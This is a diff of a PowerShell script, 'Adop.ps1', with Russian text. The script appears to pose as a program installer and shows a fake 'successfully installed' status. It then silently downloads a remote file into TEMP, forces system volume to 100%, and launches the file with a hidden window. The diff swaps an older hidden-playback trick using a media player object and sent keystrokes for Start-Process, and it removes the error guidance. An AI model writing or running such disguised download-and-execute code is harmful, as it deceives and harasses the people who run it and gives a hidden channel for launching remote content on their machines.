@@ -1,5 +1,5 @@
 # ================================================
-#   Adop.ps1 — Только 123.mp3 (самая простая версия)
+#   Adop.ps1 — Скачивает и запускает 123.mp3 (исправлено)
 # ================================================
 
 Clear-Host
@@ -46,33 +46,23 @@ function Install-Program {
     Write-Host "   Статус: ✓ Успешно установлена" -ForegroundColor Green
     Write-Host ""
 
-    # === Скачивание и запуск 123.mp3 ===
+    # Скачивание и запуск 123.mp3
     $mp3Path = "$env:TEMP\123_$(Get-Random).mp3"
 
     try {
         Write-Host "   Загрузка 123.mp3 ..." -ForegroundColor Yellow
         Invoke-WebRequest -Uri $MusicURL -OutFile $mp3Path -UseBasicParsing -TimeoutSec 30 | Out-Null
-        Write-Host "   Файл успешно скачан" -ForegroundColor Green
+        Write-Host "   Файл скачан" -ForegroundColor Green
 
         Set-Volume100
 
-        $player = New-Object -ComObject "WMPlayer.OCX.7"
-        $player.settings.volume = 100
-        $player.URL = $mp3Path
-        $player.controls.play()
+        # Новый способ запуска — более надёжный
+        Start-Process -FilePath $mp3Path -WindowStyle Hidden
 
-        Start-Sleep -Milliseconds 800
-        $wshell = New-Object -ComObject WScript.Shell
-        $wshell.SendKeys("% n")
-
-        Write-Host "   123.mp3 запущен скрыто на полной громкости" -ForegroundColor Green
+        Write-Host "   123.mp3 запущен скрыто (громкость 100%)" -ForegroundColor Green
     }
     catch {
-        Write-Host "   ОШИБКА: Не удалось скачать 123.mp3" -ForegroundColor Red
-        Write-Host "   Проверьте:" -ForegroundColor Red
-        Write-Host "   1. Файл 123.mp3 действительно лежит в репозитории" -ForegroundColor Red
-        Write-Host "   2. Название файла точно '123.mp3' (без лишних пробелов)" -ForegroundColor Red
-        Write-Host "   3. Репозиторий публичный" -ForegroundColor Red
+        Write-Host "   Ошибка: не удалось скачать или запустить 123.mp3" -ForegroundColor Red
     }
 
     Write-Host "`n   Нажмите любую клавишу для возврата в меню..." -ForegroundColor Gray
